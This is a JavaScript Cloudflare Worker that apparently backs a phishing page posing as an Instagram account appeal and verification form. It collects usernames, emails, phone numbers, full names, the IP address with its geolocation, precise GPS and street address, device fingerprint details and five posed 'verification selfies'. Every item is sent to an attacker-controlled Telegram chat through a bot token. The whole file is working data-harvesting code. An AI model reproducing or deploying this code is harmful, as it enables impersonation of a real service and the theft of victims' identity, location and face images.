const JSON_HEADERS = {
  "Content-Type": "application/json; charset=utf-8",
  "Cache-Control": "no-store",
};

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: JSON_HEADERS,
  });
}

function htmlEscape(value) {
  return String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function indiaTime() {
  return new Intl.DateTimeFormat("en-IN", {
    timeZone: "Asia/Kolkata",
    dateStyle: "medium",
    timeStyle: "medium",
  }).format(new Date());
}

async function getLocation(ip) {
  if (!ip || ip === "Unknown") return null;

  try {
    const res = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`);
    if (!res.ok) return null;

    const data = await res.json();
    return {
      city: data.city || "N/A",
      region: data.region || "N/A",
      country: data.country_name || "N/A",
      postal: data.postal || "N/A",
    };
  } catch {
    return null;
  }
}

async function sendTelegramMessage(env, text) {
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
    throw new Error("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not configured");
  }

  const url =
    `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;

  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: env.TELEGRAM_CHAT_ID,
      text,
      parse_mode: "HTML",
    }),
  });

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`sendMessage failed: ${errorText}`);
  }

  return response.json();
}

async function sendTelegramPhoto(env, file, caption) {
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
    throw new Error("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not configured");
  }

  const url =
    `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;

  const formData = new FormData();
  formData.append("chat_id", env.TELEGRAM_CHAT_ID);
  formData.append(
    "photo",
    new File([file.arrayBuffer ? await file.arrayBuffer() : file], file.name || "selfie.jpg", {
      type: file.type || "image/jpeg",
    })
  );
  formData.append("caption", caption);
  formData.append("parse_mode", "HTML");

  const response = await fetch(url, {
    method: "POST",
    body: formData,
  });

  if (!response.ok) {
    const errorText = await response.text();
    console.error("Telegram API Error Response:", errorText);
    throw new Error(`sendPhoto failed: ${errorText}`);
  }

  return response.json();
}

async function submitForm(request, env) {
  const body = await request.json();

  const {
    type,
    username,
    email,
    phone,
    fullname,
    alternative,
    relationship,
    deviceInfo,
    gps,
  } = body;

  const clientIp =
    request.headers.get("CF-Connecting-IP") ||
    request.headers.get("X-Forwarded-For")?.split(",")[0]?.trim() ||
    "Unknown";

  const userAgent = request.headers.get("User-Agent") || "Unknown";

  const ipLocation = await getLocation(clientIp);
  const ipLocStr = ipLocation
    ? `${ipLocation.city}, ${ipLocation.region}, ${ipLocation.country}`
    : "N/A";

  let gpsStr = "Not provided";

  if (gps && gps.lat && gps.lon) {
    gpsStr = `
📍 <b>GPS Location:</b>
   - Latitude: ${htmlEscape(gps.lat)}
   - Longitude: ${htmlEscape(gps.lon)}
   - Address: ${htmlEscape(gps.address || "N/A")}
   - House Number: ${htmlEscape(gps.houseNumber || "N/A")}
   - Road: ${htmlEscape(gps.road || "N/A")}
   - City: ${htmlEscape(gps.city || "N/A")}
   - State: ${htmlEscape(gps.state || "N/A")}
   - Pincode: ${htmlEscape(gps.pincode || "N/A")}
   - Country: ${htmlEscape(gps.country || "N/A")}
   - Map Link: ${htmlEscape(gps.mapLink || "N/A")}`;
  }

  const deviceStr = `
🖥️ Device Info:
   - User Agent: ${htmlEscape(userAgent)}
   - Platform: ${htmlEscape(deviceInfo?.platform || "N/A")}
   - Language: ${htmlEscape(deviceInfo?.language || "N/A")}
   - Screen: ${htmlEscape(deviceInfo?.screen || "N/A")}
   - Color Depth: ${htmlEscape(deviceInfo?.colorDepth || "N/A")}
   - Timezone: ${htmlEscape(deviceInfo?.timezone || "N/A")}
   - Memory: ${htmlEscape(deviceInfo?.deviceMemory || "N/A")} GB
   - CPU Cores: ${htmlEscape(deviceInfo?.hardwareConcurrency || "N/A")}`;

  const message = `📋 <b>Instagram Appeal Form</b>
<b>Type:</b> ${htmlEscape(type)}
━━━━━━━━━━━━━━━━━━━━
<b>👤 Username:</b> ${htmlEscape(username)}
<b>📧 Email:</b> ${htmlEscape(email)}
<b>📱 Phone:</b> ${htmlEscape(phone || "N/A")}
<b>📝 Name:</b> ${htmlEscape(fullname)}
<b>🔗 Alt Account:</b> ${htmlEscape(alternative || "N/A")}
<b>👥 Relationship:</b> ${htmlEscape(relationship)}
━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP Address:</b> ${htmlEscape(clientIp)}
📍 <b>IP Location:</b> ${htmlEscape(ipLocStr)}
${gpsStr}
${deviceStr}
━━━━━━━━━━━━━━━━━━━━
<b>🕐 Time:</b> ${htmlEscape(indiaTime())}`;

  await sendTelegramMessage(env, message);
  return json({ success: true });
}

async function submitSelfie(request, env) {
  const form = await request.formData();
  const file = form.get("photo");

  if (!(file instanceof File)) {
    console.error("No photo in request");
    return json({ error: "No photo uploaded" }, 400);
  }

  if (file.size > 10 * 1024 * 1024) {
    return json({ error: "Photo exceeds 10 MB limit" }, 400);
  }

  const username = form.get("username");
  const formType = form.get("formType");
  const poseText = form.get("poseText");
  const poseNumber = form.get("poseNumber");

  const caption = `📸 <b>Verification Selfie ${htmlEscape(poseNumber)}/5</b>

<b>👤 User:</b> ${htmlEscape(username)}
<b>📝 Pose:</b> ${htmlEscape(poseText)}
<b>📋 Type:</b> ${htmlEscape(formType)}
<b>🕐 Time:</b> ${htmlEscape(indiaTime())}`;

  await sendTelegramPhoto(env, file, caption);
  return json({ success: true });
}

async function verificationComplete(request, env) {
  const { username, email, phone, fullname, formType } = await request.json();

  const message = `✅ <b>VERIFICATION COMPLETED</b>
<b>👤 User:</b> ${htmlEscape(username)}
<b>📧 Email:</b> ${htmlEscape(email)}
<b>📱 Phone:</b> ${htmlEscape(phone || "N/A")}
<b>📝 Name:</b> ${htmlEscape(fullname)}
<b>📋 Form:</b> ${htmlEscape(formType)}
<b>📸 Photos:</b> 5/5
<b>✓ Status:</b> Ready for Review
<b>🕐 Completed:</b> ${htmlEscape(indiaTime())}`;

  await sendTelegramMessage(env, message);
  return json({ success: true });
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    try {
      if (url.pathname === "/api/submit-form" && request.method === "POST") {
        return await submitForm(request, env);
      }

      if (url.pathname === "/api/submit-selfie" && request.method === "POST") {
        return await submitSelfie(request, env);
      }

      if (
        url.pathname === "/api/verification-complete" &&
        request.method === "POST"
      ) {
        return await verificationComplete(request, env);
      }

      // Everything else is served from the existing public/ directory.
      return env.ASSETS.fetch(request);
    } catch (error) {
      console.error("Worker request error:", error);

      return json(
        {
          success: false,
          error: "Server error",
          // Safe diagnostic message for logs; do not expose secrets.
          message: error instanceof Error ? error.message : String(error),
        },
        500
      );
    }
  },
};
